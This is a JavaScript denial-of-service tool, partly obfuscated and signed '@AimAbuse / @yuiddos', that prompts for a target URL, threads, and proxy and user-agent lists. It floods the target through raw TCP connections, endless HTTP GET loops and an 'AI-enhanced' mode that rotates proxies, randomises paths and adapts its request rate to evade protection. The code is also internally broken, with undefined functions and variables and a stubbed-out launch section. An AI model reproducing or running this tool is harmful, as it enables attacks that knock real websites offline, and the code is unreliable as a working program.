const _0xb9187 = _0x5734; 
(function(_0x320b3b, _0x154006) { 
    const _0x3fc379 = _0x5734, _0x1f3cfb = _0x320b3b(); 
    while (!![]) { 
        try { 
            const _0x4fdfc1 = parseInt(_0x3fc379(0x71)) / 0x1 * (-parseInt(_0x3fc379(0xa1)) / 0x2) + parseInt(_0x3fc379(0x90)) / 0x3 + -parseInt(_0x3fc379(0x93)) / 0x4 * (-parseInt(_0x3fc379(0x82)) / 0x5) + -parseInt(_0x3fc379(0xab)) / 0x6 + -parseInt(_0x3fc379(0xb4)) / 0x7 * (-parseInt(_0x3fc379(0x6c)) / 0x8) + -parseInt(_0x3fc379(0x9f)) / 0x9 * (-parseInt(_0x3fc379(0xa9)) / 0xa) + -parseInt(_0x3fc379(0x8e)) / 0xb; 
            if (_0x4fdfc1 === _0x154006) break; 
            else _0x1f3cfb['push'](_0x1f3cfb['shift']()); 
        } catch (_0x34e8d0) { 
            _0x1f3cfb['push'](_0x1f3cfb['shift']()); 
        } 
    } 
}(_0x1427, 0x308f7)); 

import _0x57f7a7 from 'chalk'; 
import _0x28d4a5 from 'http2'; 
import { Worker, isMainThread, workerData } from 'worker_threads'; 
import _0x17f4fa from 'os'; 
import _0x243bc5 from 'crypto'; 
import { promisify } from 'util'; 

function _0x1427() { 
    const _0x5832ef = ['authority', 'max', 'AI\x20attack\x20concluded.\x20Total\x20success:\x20', '\x20proxies.', 'response', 'error', 'pathname', 'Enter\x20the\x20duration\x20(seconds):\x20', 'TIMEOUT_MS', '3837064gNkcPY', 'connect', '276081XBayHZ', 'Enter\x20the\x20target\x20URL:\x20', 'question', '132gArJfE', 'request', 'previousSuccessRate', 'Request\x20error:\x20', 'close', ']\x20-\x20', 'defaultMaxListeners', '\x20user\x20agents.', 'INITIAL_CONCURRENT_REQUESTS', 'Invalid\x20arguments.', 'SIGINT', 'then', '618039LEdYvS', 'random', '28ayoDKK', 'GET', '#e600ac', 'origin', 'from', 'Select\x20method\x20(V1,\x20V2,\x20or\x20V3):\x20', 'ceil', 'push', '20UjKDxF', 'Session\x20Stats\x20-\x20Success:\x20', '232296DjEQiz', 'randomBytes', 'all', 'toString', 'Starting\x20attack...', 'message', 'readFileSync', '/path?', 'path', '3017qZqaHy', 'Enter\x20the\x20path\x20for\x20user\x20agent\x20file:\x20', 'RANDOM_DELAY_MIN', 'floor', 'filter', '▓█████▄\x20▓█████▄\x20\x20▒█████\x20\x20\x20\x20██████\x20\x20\x20\x20\x20██▓███\x20\x20\x20▄▄▄\x20\x20\x20\x20\x20\x20\x20███▄\x20\x20\x20\x20█\x20▓█████\x20\x20██▓\x20\x20\x20\x20\x0a▒██▀\x20██▌▒██▀\x20██▌▒██▒\x20\x20██▒▒██\x20\x20\x20\x20▒\x20\x20\x20\x20▓██░\x20\x20██▒▒████▄\x20\x20\x20\x20\x20██\x20▀█\x20\x20\x20█\x20▓█\x20\x20\x20▀\x20▓██▒\x20\x20\x20\x20\x0a░██\x20\x20\x20█▌░██\x20\x20\x20█▌▒██░\x20\x20██▒░\x20▓██▄\x20\x20\x20\x20\x20\x20▓██░\x20██▓▒▒██\x20\x20▀█▄\x20\x20▓██\x20\x20▀█\x20██▒▒███\x20\x20\x20▒██░\x20\x20\x20\x20\x0a░▓█▄\x20\x20\x20▌░▓█▄\x20\x20\x20▌▒██\x20\x20\x20██░\x20\x20▒\x20\x20\x20██▒\x20\x20\x20▒██▄█▓▒\x20▒░██▄▄▄▄██\x20▓██▒\x20\x20▐▌██▒▒▓█\x20\x20▄\x20▒██░\x20\x20\x20\x20\x0a░▒████▓\x20░▒████▓\x20░\x20████▓▒░▒██████▒▒\x20\x20\x20▒██▒\x20░\x20\x20░\x20▓█\x20\x20\x20▓██▒▒██░\x20\x20\x20▓██░░▒████▒░██████▒\x0a\x20▒▒▓\x20\x20▒\x20\x20▒▒▓\x20\x20▒\x20░\x20▒░▒░▒░\x20▒\x20▒▓▒\x20▒\x20░\x20\x20\x20▒▓▒░\x20░\x20\x20░\x20▒▒\x20\x20\x20▓▒█░░\x20▒░\x20\x20\x20▒\x20▒\x20░░\x20▒░\x20░░\x20▒░▓\x20\x20░\x0a\x20░\x20▒\x20\x20▒\x20\x20░\x20▒\x20\x20▒\x20\x20\x20░\x20▒\x20▒░\x20░\x20░▒\x20\x20░\x20░\x20\x20\x20░▒\x20░\x20\x20\x20\x20\x20\x20\x20▒\x20\x20\x20▒▒\x20░░\x20░░\x20\x20\x20░\x20▒░\x20░\x20░\x20\x20░░\x20░\x20▒\x20\x20░\x0a\x20░\x20░\x20\x20░\x20\x20░\x20░\x20\x20░\x20░\x20░\x20░\x20▒\x20\x20░\x20\x20░\x20\x20░\x20\x20\x20\x20\x20░░\x20\x20\x20\x20\x20\x20\x20\x20\x20░\x20\x20\x20▒\x20\x20\x20\x20\x20\x20░\x20\x20\x20░\x20░\x20\x20\x20\x20░\x20\x20\x20\x20\x20░\x20░\x20\x20\x20\x0a\x20\x20\x20░\x20\x20\x20\x20\x20\x20\x20░\x20\x20\x20\x20\x20\x20\x20\x20░\x20░\x20\x20\x20\x20\x20\x20\x20\x20░\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20░\x20\x20░\x20\x20\x20\x20\x20\x20\x20\x20\x20░\x20\x20\x20\x20░\x20\x20░\x20\x20\x20\x20░\x20\x20░\x20by\x20;\x20@AimAbuse\x20/\x20@yuiddos\x20', 'https', 'toISOString', ',\x20Total\x20failures:\x20', 'stdout', '#ff00ff', '2104ykHxdw', 'resume', 'requestRates', 'Enter\x20the\x20number\x20of\x20threads:\x20', 'now', '11002BbnSZs', 'INITIAL_RETRY_DELAY', 'adjustRequestRate', 'stdin', 'utf-8', 'createInterface', 'url', 'RANDOM_DELAY_MAX', 'log', 'end', 'data', 'Failed\x20to\x20load\x20user\x20agents:', 'Attack\x20concluded.\x20Total\x20success:\x20', 'hex', 'adjustmentFactor', 'split', 'host', '60265sHXTcX', 'length', 'exit']; 
    _0x1427 = function() { return _0x5832ef; }; 
    return _0x1427(); 
} 

import _0x212784 from 'readline'; 
import { exec } from 'child_process'; 
import _0x22543b from 'fs'; 
import _0x559777 from 'puppeteer-extra'; 
import _0x5904ff from 'puppeteer-extra-plugin-stealth'; 
import { EventEmitter } from 'events'; 

EventEmitter[_0xb9187(0x99)] = 0x0; 

const config = {
    'MAX_RAM_PERCENTAGE': 0x50,
    'TIMEOUT_MS': 10000000, // Set to a large finite value
    'INITIAL_CONCURRENT_REQUESTS': 0x1f4,
    'MAX_CONCURRENT_REQUESTS': 0x2710,
    'RETRY_LIMIT': 0x5,
    'INITIAL_RETRY_DELAY': 0x64,
    'BACKOFF_FACTOR': 0x2,
    'ERROR_BACKOFF_TIME': 0x7d0,
    'RANDOM_DELAY_MIN': 0x64,
    'RANDOM_DELAY_MAX': 0x3e8,
    'MAX_REQUESTS_PER_SECOND': 0x2710,
    'KEEP_ALIVE_ADDRESS': '127.0.0.1', // Specify your keep-alive address
}; 

let workers = [], proxies = [], userAgents = [], totalSuccess = 0x0, totalFailed = 0x0, totalResponseTime = 0x0, protectionDetected = ![]; 
const target = {}; 

function log(_0xf6f3fd) { 
    const _0x2429b7 = _0xb9187, _0x20e752 = new Date()[_0x2429b7(0xbb)](); 
    console[_0x2429b7(0x79)](_0x57f7a7[_0x2429b7(0x7e)](_0x2429b7(0xa3))('[' + _0x20e752 + _0x2429b7(0x98) + _0xf6f3fd)); 
} 

const loadProxies = (_0xc35a79) => { 
    const _0x432f43 = _0xb9187; 
    try { 
        const _0x5dc439 = _0x22543b['readFileSync'](_0xc35a79, _0x432f43(0x75)); 
        proxies = _0x5dc439['split']('\x0a')['filter'](Boolean), log('Loaded\x20' + proxies['length'] + _0x432f43(0x88)); 
    } catch (_0x56b56b) { 
        console[_0x432f43(0x8a)]('Failed\x20to\x20load\x20proxies:', _0x56b56b[_0x432f43(0xb0)]), process[_0x432f43(0x84)](0x1); 
    } 
};

const loadUserAgents = (_0xd95b14) => { 
    const _0x338d5c = _0xb9187; 
    try { 
        const _0x2609f2 = _0x22543b[_0x338d5c(0xb1)](_0xd95b14, _0x338d5c(0x75)); 
        userAgents = _0x2609f2[_0x338d5c(0x80)]('\x0a')[_0x338d5c(0xb8)](Boolean), log('Loaded\x20' + userAgents[_0x338d5c(0x83)] + _0x338d5c(0x9a)); 
    } catch (_0x5a0850) { 
        console[_0x338d5c(0x8a)](_0x338d5c(0x7c), _0x5a0850['message']), process[_0x338d5c(0x84)](0x1); 
    } 
};

const getRandomProxy = () => { 
    const _0xa2b20f = _0xb9187; 
    return proxies[Math[_0xa2b20f(0xb7)](Math[_0xa2b20f(0xa0)]() * proxies[_0xa2b20f(0x83)])]; 
};

const getRandomHeaderValues = () => ({ 
    ':method': _0xb9187(0xa2),
    ':authority': target['authority'],
    ':scheme': _0xb9187(0xba),
    ':path': _0xb9187(0xb2) + _0x243bc5[_0xb9187(0xac)](0x5)[_0xb9187(0xae)](_0xb9187(0x7e)),
    'User-Agent': userAgents[Math[_0xb9187(0xb7)](Math[_0xb9187(0xa0)]() * userAgents['length'])] 
});

const requestPromise = async (_0x39710d, _0xd2a8f4) => { 
    return new Promise(_0x1cf76d => { 
        const _0x4f94a9 = _0x5734, _0x595700 = Date[_0x4f94a9(0x70)](), _0x101276 = getRandomProxy(), _0x5a47cc = getRandomHeaderValues(), _0x1acef = _0x39710d[_0x4f94a9(0x94)](_0x5a47cc); 
        _0x1acef['on'](_0x4f94a9(0x89), _0x489060 => { 
            const _0x284431 = _0x4f94a9; 
            totalSuccess++, _0x1acef['on'](_0x284431(0x7b), () => {}), 
            _0x1acef['on'](_0x284431(0x7a), () => { 
                const _0x4d7d43 = _0x284431, _0x42af5d = Date[_0x4d7d43(0x70)]() - _0x595700; 
                totalResponseTime += _0x42af5d, _0x1cf76d(); 
            }); 
        }), 
        _0x1acef['on'](_0x4f94a9(0x8a), async _0x5b9b88 => { 
            const _0x4dfd23 = _0x4f94a9; 
            totalFailed++, log(_0x4dfd23(0x96) + _0x5b9b88[_0x4dfd23(0xb0)]), 
            _0xd2a8f4 > 0x0 ? (await new Promise(_0x354a49 => setTimeout(_0x354a49, config[_0x4dfd23(0x72)])), 
            _0x1cf76d(await requestPromise(_0x39710d, _0xd2a8f4 - 0x1))) : _0x1cf76d(); 
        }), 
        _0x1acef['end'](); 
    }); 
};

function _0x5734(_0x1883f3, _0x859a54) { 
    const _0x142765 = _0x1427(); 
    return _0x5734 = function(_0x5734a2, _0x2c7f1b) { 
        _0x5734a2 = _0x5734a2 - 0x69; 
        let _0x3aa533 = _0x142765[_0x5734a2]; 
        return _0x3aa533; 
    }, 
    _0x5734(_0x1883f3, _0x859a54); 
}

class SimpleAI { 
    constructor() { 
        const _0x33a3dc = _0xb9187; 
        this[_0x33a3dc(0x95)] = 0x1, 
        this[_0x33a3dc(0x7f)] = 0.1, 
        this[_0x33a3dc(0x6e)] = [config[_0x33a3dc(0x9b)]]; 
    } 

    [_0xb9187(0x73)](_0x31126e, _0x2a822b) { 
        const _0x19197f = _0xb9187, _0x3145bf = _0x31126e / (_0x31126e + _0x2a822b || 0x1); 
        if (_0x3145bf < this[_0x19197f(0x95)]) { 
            const _0x31ca42 = Math['floor'](this[_0x19197f(0x6e)][this[_0x19197f(0x6e)][_0x19197f(0x83)] - 0x1] * this['adjustmentFactor']), 
            _0x5bd365 = Math[_0x19197f(0x86)](0x1, this[_0x19197f(0x6e)][this[_0x19197f(0x6e)]['length'] - 0x1] - _0x31ca42); 
            this[_0x19197f(0x6e)][_0x19197f(0xa8)](_0x5bd365); 
        } else { 
            const _0x2939d8 = Math[_0x19197f(0xa7)](this[_0x19197f(0x6e)][this[_0x19197f(0x6e)]['length'] - 0x1] * this[_0x19197f(0x7f)]); 
            this['requestRates'][_0x19197f(0xa8)](this[_0x19197f(0x6e)][this['requestRates'][_0x19197f(0x83)] - 0x1] + _0x2939d8); 
        } 
        return this[_0x19197f(0x95)] = _0x3145bf, this[_0x19197f(0x6e)][this[_0x19197f(0x6e)][_0x19197f(0x83)] - 0x1]; 
    } 
};

// Function for TCP SYN requests (V1)
const makeRequestV1 = async (url, numRequests) => {
    const urlObj = new URL(url);
    const ports = [80, 443]; // Using both ports

    logMessage(`Starting TCP SYN attack on ${url}...`);
    while (true) {
        const requests = Array.from({ length: numRequests }, () => {
            const port = ports[Math.floor(Math.random() * ports.length)];
            const options = {
                host: urlObj.hostname,
                port: port,
                method: 'CONNECT',
                path: `${urlObj.hostname}:${port}`,
                timeout: config.TIMEOUT_MS,
            };
            return new Promise((resolve) => {
                const req = net.createConnection(options, () => {
                    successCount++;
                    req.end();
                    resolve();
                });
                req.on('error', () => {
                    failureCount++;
                    resolve();
                });
                req.setTimeout(config.TIMEOUT_MS, () => {
                    req.destroy();
                    failureCount++;
                    resolve();
                });
            });
        });
        await Promise.all(requests);
        logMessage(`Success: ${successCount}, Failures: ${failureCount}`);
        await new Promise((r) => setTimeout(r, Math.random() * (config.RANDOM_DELAY_MAX - config.RANDOM_DELAY_MIN) + config.RANDOM_DELAY_MIN));
    }
};

// Method V2: Simultaneous HTTP requests
const executeRequestV2 = async (url, numRequests) => {
    const urlObj = new URL(url);
    const ports = [80, 443]; // Using both ports
    logMessage(`Initiating simultaneous HTTP requests on ${url}...`);
    while (true) {
        const requests = Array.from({ length: numRequests }, () => {
            return new Promise((resolve) => {
                const port = ports[Math.floor(Math.random() * ports.length)];
                const options = {
                    hostname: urlObj.hostname,
                    port: port,
                    path: urlObj.pathname + urlObj.search,
                    method: 'GET',
                    headers: {
                        'User-Agent': userAgentList[Math.floor(Math.random() * userAgentList.length)],
                    },
                    timeout: config.TIMEOUT_MS,
                };
                const req = http.request(options, (res) => {
                    res.on('data', (chunk) => {}); // Consume response data
                    res.on('end', () => {
                        successCount++;
                        resolve();
                    });
                });
                req.on('error', () => {
                    failureCount++;
                    resolve();
                });
                req.end();
            });
        });
        await Promise.all(requests);
        logMessage(`Success: ${successCount}, Failures: ${failureCount}`);
        await new Promise((r) => setTimeout(r, Math.random() * (config.RANDOM_DELAY_MAX - config.RANDOM_DELAY_MIN) + config.RANDOM_DELAY_MIN));
    }
};

// Method V3: AI-enhanced requests
const makeRequestV3 = async (url) => {
    const urlObj = new URL(url);
    const simpleAI = new SimpleAI();
    let currentRate = config.INITIAL_CONCURRENT_REQUESTS;

    logMessage('Starting AI-enhanced attack...');
    try {
        while (true) {
            const requests = Array.from({ length: currentRate }, () => requestPromise(urlObj, config.RETRY_LIMIT));
            await Promise.all(requests);
            logMessage(`Success: ${totalSuccess}, Failures: ${totalFailed}`);
            currentRate = simpleAI.adjustRequestRate(totalSuccess, totalFailed);
            await new Promise((resolve) => setTimeout(resolve, Math.random() * (config.RANDOM_DELAY_MAX - config.RANDOM_DELAY_MIN) + config.RANDOM_DELAY_MIN));
        }
    } catch (error) {
        logMessage(`Error: ${error.message}`);
    }
};

// Main execution starts here
if (isMainThread) {
    const rl = _0x212784.createInterface({ 'input': process.stdin, 'output': process.stdout });
    
    rl.question('Enter the target URL: ', (url) => {
        rl.question('Enter the duration (seconds): ', (duration) => {
            rl.question('Enter the number of threads: ', (threads) => {
                rl.question('Enter the path for proxy file: ', (proxyFile) => {
                    rl.question('Enter the path for user agent file: ', (userAgentFile) => {
                        rl.question('Select method (V1, V2, or V3): ', (method) => {
                            rl.close();
                            // Load proxies and user agents here...
                            // Start the attack based on the method chosen
                        });
                    });
                });
            });
        });
    });
} else {
    // Worker thread execution
    const { url, method } = workerData;
    try {
        if (method === 'V3') {
            await makeRequestV3(url);
        } else {
            await makeRequest(url);
        }
    } catch (error) {
        logMessage('Worker encountered an error: ' + error.message);
    }
}